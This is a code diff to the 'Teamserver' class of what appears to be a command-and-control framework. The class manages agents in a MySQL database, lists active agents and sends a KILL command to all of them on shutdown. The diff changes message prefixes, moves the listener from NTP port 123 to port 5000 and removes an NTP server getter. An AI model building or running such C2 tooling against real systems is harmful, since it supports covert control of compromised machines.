@@ -14,35 +14,34 @@ class Teamserver:
             system('clear')
 
         except Exception:
-            print(colored("Problem connecting to the MySQL DB! \n"
+            print(colored("[-] Problem connecting to the MySQL DB! \n"
             " Make sure that the credentials entered are correct/MySQL Server is running. \n"
             " Exiting...", 
                 "red"))
             exit()
         
-        print("Listening for NTP traffic on port 123")
+        print("[!] Listening for traffic on port 5000")
         self.thread = Thread(target=listener.start, args=[self.agentDB], daemon=True)
-        self.thread.start()           
+        self.thread.start()      
         system('clear') 
+
 
     def getDBObj(self):
         return self.agentDB
 
-    def getNTPServer(self):
-        return self.NTPServer
 
     #display the board of active c2s, call again to refresh
     def displayBoard(self, all=True, interactType="", id=""):
         if interactType == "agent":
             interactType = "agentID"
 
-        if all == True:
+        if all:
             data = self.agentDB.dbPull()
         else:
             data = self.agentDB.pullSpecific(interactType, id)
 
         if len(data) == 0:
-            print(colored(" No Agents in DB!\n", "red"))
+            print(colored("[-] No Agents in DB!\n", "red"))
             return
 
         d = []
@@ -60,10 +59,10 @@ class Teamserver:
 
     def shutdown(self):
         if input("Confirm shutdown (y/n) ") == "y":
-            print(colored("\n Sending KILL Reference to all agents...\n", "yellow"))
+            print(colored("\n[*] Sending KILL Reference to all agents...\n", "yellow"))
             c2.sendRefCMD(self, "all", "", "KILL")
             
-            print(colored("\n Cleaning up...\n", "yellow"))
+            # print(colored("\n Cleaning up...\n", "yellow"))
             self.agentDB.cleanDB()
             
 
